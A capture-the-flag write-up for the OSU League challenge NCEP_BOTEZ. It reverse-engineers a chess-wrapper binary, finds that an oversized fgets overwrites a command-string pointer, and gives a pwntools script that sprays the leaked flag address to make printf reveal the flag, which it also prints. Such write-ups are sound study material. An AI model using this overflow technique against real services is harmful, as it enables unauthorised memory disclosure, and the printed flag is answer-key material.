---
title: "OSU League 2020/2021 - NCEP_BOTEZ Writeup"
date: 2021-04-11
draft: false
description: ""
tags: ["ctf"]
---
For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC. 
Running the program there is that same GNU chess game that we can interact with, but this time we have no control over the command line arguments, so no injection. Messing around with the program we can see that the only place we have any sort of control is when we make our move:

```
flag loaded at 0x562c0e2e8260
executing command: /usr/games/gnuchess -g -m
GNU Chess 6.2.5
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
White (1) : 
```

We are also given the location in memory of where the flag is loaded in at, which gives us a clue that whatever our payload is going to be must include it. At this point we started to do some static analysis to see where we could exploit something.

Since there is only one place in the program where we can put in user input, we started our reverse engineering there:

```c++
void get_input(long param_1)

{
  memset((void *)(param_1 + 0x110),0,0x100);
  fgets((char *)(param_1 + 0x110),0x500,stdin);
  return;
}
```

Interseting, it looks like we do an `fgets` to `param_1` plus an offset, but `param_1` is a variable that was passed into this function, so we followed that parameter up to see where it came from. Eventually, we were led to the main function of the program where we can see where it was initilized:

```c++
undefined8 main(void)

{
  void *__ptr;
  void *__ptr_00;
  
  __ptr = (void *)load_flag();
  __ptr_00 = malloc(0x21c);
  init_game(__ptr_00);
  printf("executing command: %s\n",*(undefined8 *)((long)__ptr_00 + 0x210));
  launch_gnuchess(__ptr_00);
  thread_handler(__ptr_00);
  printf("finished executing command %s\n",*(undefined8 *)((long)__ptr_00 + 0x210));
  free(__ptr_00);
  free(__ptr);
  return 0;
}
```

So now we know that `void *__ptr_00` is our `param_1`, but what is interesting here is how much it is being reused. We can see that it is used in the first `printf` to print the command that was excecuted, but then it gets passed into the `thread_handler` function, which is what eventually leads to our `fgets` being called. So the same pointer holding the string of our command is also being used for the `fgets`. This normally wouldn't be a problem since a null terminator is used to mark the end of a string, but here we see that quite a large buffer was used to allocate this particular char array. Maybe if we fill up that buffer and put the address of our flag in the string, we can make the second `printf` print the flag. Let's try it out:

```python
from pwn import *
import os, sys

io = remote('ctf.ropcity.com', 31315)

io.recvuntil("flag loaded at ")
addr = int(io.recvline(), 16)

flag = p64(addr)

io.recvuntil("White (1) : ")

payload = flag*100

io.sendline(payload)
io.interactive()
```

And running it we get the flag: 
`osu{ro$eN_w1LL_not_8e_th1$_4givinG}`